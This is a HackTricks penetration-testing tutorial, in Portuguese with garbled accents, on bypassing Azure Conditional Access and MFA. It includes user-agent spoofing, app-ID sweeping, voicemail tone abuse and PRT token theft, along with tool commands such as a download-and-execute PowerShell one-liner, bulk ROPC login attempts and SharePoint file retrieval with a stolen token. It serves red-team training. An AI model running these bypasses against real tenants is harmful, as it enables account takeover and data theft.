# Az - Pol√≠ticas de Acesso Condicional e Bypass de MFA

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

As pol√≠ticas de Acesso Condicional do Azure s√£o regras configuradas no Microsoft Azure para impor controles de acesso a servi√ßos e aplicativos do Azure com base em certas **condi√ß√µes**. Essas pol√≠ticas ajudam as organiza√ß√µes a proteger seus recursos aplicando os controles de acesso corretos nas circunst√¢ncias adequadas.\
As pol√≠ticas de acesso condicional basicamente **definem** **Quem** pode acessar **O Que** de **Onde** e **Como**.

Aqui est√£o alguns exemplos:

1. **Pol√≠tica de Risco de Login**: Esta pol√≠tica pode ser configurada para exigir autentica√ß√£o multifator (MFA) quando um risco de login √© detectado. Por exemplo, se o comportamento de login de um usu√°rio for incomum em compara√ß√£o com seu padr√£o regular, como fazer login de um pa√≠s diferente, o sistema pode solicitar autentica√ß√£o adicional.
2. **Pol√≠tica de Conformidade de Dispositivo**: Esta pol√≠tica pode restringir o acesso aos servi√ßos do Azure apenas a dispositivos que estejam em conformidade com os padr√µes de seguran√ßa da organiza√ß√£o. Por exemplo, o acesso pode ser permitido apenas a partir de dispositivos que tenham software antiv√≠rus atualizado ou que estejam executando uma determinada vers√£o do sistema operacional.

## Bypasses de Pol√≠ticas de Acesso Condicional

√â poss√≠vel que uma pol√≠tica de acesso condicional esteja **verificando algumas informa√ß√µes que podem ser facilmente manipuladas, permitindo um bypass da pol√≠tica**. E se, por exemplo, a pol√≠tica estiver configurando MFA, o atacante poder√° contorn√°-la.

Ao configurar uma pol√≠tica de acesso condicional, √© necess√°rio indicar os **usu√°rios** afetados e os **recursos-alvo** (como todos os aplicativos em nuvem).

Tamb√©m √© necess√°rio configurar as **condi√ß√µes** que ir√£o **disparar** a pol√≠tica:

* **Rede**: IP, intervalos de IP e localiza√ß√µes geogr√°ficas
* Pode ser contornado usando um VPN ou Proxy para se conectar a um pa√≠s ou conseguindo fazer login a partir de um endere√ßo IP permitido
* **Riscos da Microsoft**: Risco do usu√°rio, risco de login, risco interno
* **Plataformas de dispositivos**: Qualquer dispositivo ou selecionar Android, iOS, Windows phone, Windows, macOS, Linux
* Se ‚ÄúQualquer dispositivo‚Äù n√£o estiver selecionado, mas todas as outras op√ß√µes estiverem selecionadas, √© poss√≠vel contorn√°-la usando um user-agent aleat√≥rio n√£o relacionado a essas plataformas
* **Aplicativos cliente**: As op√ß√µes s√£o ‚ÄúNavegador‚Äù, ‚ÄúAplicativos m√≥veis e clientes de desktop‚Äù, ‚ÄúClientes Exchange ActiveSync‚Äù e ‚ÄúOutros clientes‚Äù
* Para contornar o login com uma op√ß√£o n√£o selecionada
* **Filtro para dispositivos**: √â poss√≠vel gerar uma regra relacionada ao dispositivo usado
* **Fluxos de autentica√ß√£o**: As op√ß√µes s√£o ‚ÄúFluxo de c√≥digo de dispositivo‚Äù e ‚ÄúTransfer√™ncia de autentica√ß√£o‚Äù
* Isso n√£o afetar√° um atacante, a menos que ele esteja tentando abusar de algum desses protocolos em uma tentativa de phishing para acessar a conta da v√≠tima

Os poss√≠veis **resultados** s√£o: Bloquear ou Conceder acesso com condi√ß√µes potenciais como exigir MFA, dispositivo em conformidade...

### Plataformas de Dispositivos - Condi√ß√£o de Dispositivo

√â poss√≠vel definir uma condi√ß√£o com base na **plataforma do dispositivo** (Android, iOS, Windows, macOS...), no entanto, isso √© baseado no **user-agent**, ent√£o √© f√°cil de contornar. Mesmo **fazendo todas as op√ß√µes exigirem MFA**, se voc√™ usar um **user-agent que n√£o √© reconhecido,** voc√™ poder√° contornar o MFA ou bloqueio:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Basta fazer o navegador **enviar um user-agent desconhecido** (como `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) para n√£o disparar essa condi√ß√£o.\
Voc√™ pode alterar o user agent **manualmente** nas ferramentas de desenvolvedor:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Ou usar uma [extens√£o de navegador como esta](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Localiza√ß√µes: Pa√≠ses, intervalos de IP - Condi√ß√£o de Dispositivo

Se isso estiver configurado na pol√≠tica condicional, um atacante pode simplesmente usar um **VPN** no **pa√≠s permitido** ou tentar encontrar uma maneira de acessar a partir de um **endere√ßo IP permitido** para contornar essas condi√ß√µes.

### Aplicativos em Nuvem

√â poss√≠vel configurar **pol√≠ticas de acesso condicional para bloquear ou for√ßar**, por exemplo, MFA quando um usu√°rio tenta acessar um **aplicativo espec√≠fico**:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Para tentar contornar essa prote√ß√£o, voc√™ deve ver se consegue **entrar em qualquer aplicativo**.\
A ferramenta [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) tem **dezenas de IDs de aplicativos codificados** e tentar√° fazer login neles e inform√°-lo, e at√© mesmo fornecer o token se for bem-sucedido.

Para **testar IDs de aplicativos espec√≠ficos em recursos espec√≠ficos**, voc√™ tamb√©m pode usar uma ferramenta como:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

Al√©m disso, tamb√©m √© poss√≠vel proteger o m√©todo de login (por exemplo, se voc√™ est√° tentando fazer login pelo navegador ou por um aplicativo de desktop). A ferramenta [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) realiza algumas verifica√ß√µes para tentar contornar essas prote√ß√µes tamb√©m.

A ferramenta [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) tamb√©m pode ser usada para prop√≥sitos semelhantes, embora pare√ßa n√£o estar mantida.

A ferramenta [**ROPCI**](https://github.com/wunderwuzzi23/ropci) tamb√©m pode ser usada para testar essas prote√ß√µes e ver se √© poss√≠vel contornar os MFAs ou bloqueios, mas essa ferramenta funciona a partir de uma perspectiva **whitebox**. Voc√™ primeiro precisa baixar a lista de aplicativos permitidos no inquilino e, em seguida, tentar√° fazer login neles.

## Outros Bypasses de Az MFA

### Toque de chamada

Uma op√ß√£o de Azure MFA √© **receber uma chamada no n√∫mero de telefone configurado** onde ser√° solicitado ao usu√°rio que **envie o caractere `#`**.

{% hint style="danger" %}
Como os caracteres s√£o apenas **tons**, um atacante poderia **comprometer** a mensagem de **correio de voz** do n√∫mero de telefone, configurando como mensagem o **tom de `#`** e, em seguida, ao solicitar o MFA, garantir que o **telefone da v√≠tima esteja ocupado** (ligando para ele) para que a chamada do Azure seja redirecionada para o correio de voz.
{% endhint %}

### Dispositivos Compat√≠veis

As pol√≠ticas frequentemente exigem um dispositivo compat√≠vel ou MFA, ent√£o um **atacante poderia registrar um dispositivo compat√≠vel**, obter um **token PRT** e **contornar assim o MFA**.

Comece registrando um **dispositivo compat√≠vel no Intune**, depois **obtenha o PRT** com:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Encontre mais informa√ß√µes sobre esse tipo de ataque na seguinte p√°gina:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Ferramentas

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Este script obt√©m algumas credenciais de usu√°rio e verifica se pode fazer login em algumas aplica√ß√µes.

Isso √© √∫til para ver se voc√™ **n√£o precisa de MFA para fazer login em algumas aplica√ß√µes** que voc√™ pode posteriormente abusar para **escalar privil√©gios**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Obtenha todas as pol√≠ticas
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep √© um script PowerShell que tenta **fazer login em v√°rios servi√ßos da Microsoft usando um conjunto de credenciais fornecido e tentar√° identificar se o MFA est√° habilitado**. Dependendo de como as pol√≠ticas de acesso condicional e outras configura√ß√µes de autentica√ß√£o multifatorial est√£o configuradas, alguns protocolos podem acabar sendo deixados como fator √∫nico. Ele tamb√©m possui uma verifica√ß√£o adicional para configura√ß√µes de ADFS e pode tentar fazer login no servidor ADFS local se detectado.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Esta ferramenta ajudou a identificar contornos de MFA e, em seguida, abusar de APIs em m√∫ltiplos locat√°rios de AAD em produ√ß√£o, onde os clientes do AAD acreditavam ter MFA aplicado, mas a autentica√ß√£o baseada em ROPC foi bem-sucedida.

{% hint style="success" %}
Voc√™ precisa ter permiss√µes para listar todos os aplicativos para poder gerar a lista dos aplicativos a serem for√ßados.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token √© um conjunto de fun√ß√µes que visa ajudar consultores de seguran√ßa que precisam validar Pol√≠ticas de Acesso Condicional, testes para portais Microsoft com 2FA habilitado, etc..

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Teste cada portal** se √© poss√≠vel **fazer login sem MFA**:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Porque o **portal** **Azure** **n√£o √© restrito**, √© poss√≠vel **coletar um token do endpoint do portal para acessar qualquer servi√ßo detectado** pela execu√ß√£o anterior. Neste caso, o Sharepoint foi identificado, e um token para acess√°-lo √© solicitado:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Supondo que o token tenha a permiss√£o Sites.Read.All (do Sharepoint), mesmo que voc√™ n√£o consiga acessar o Sharepoint pela web por causa do MFA, √© poss√≠vel usar o token para acessar os arquivos com o token gerado:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Refer√™ncias

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
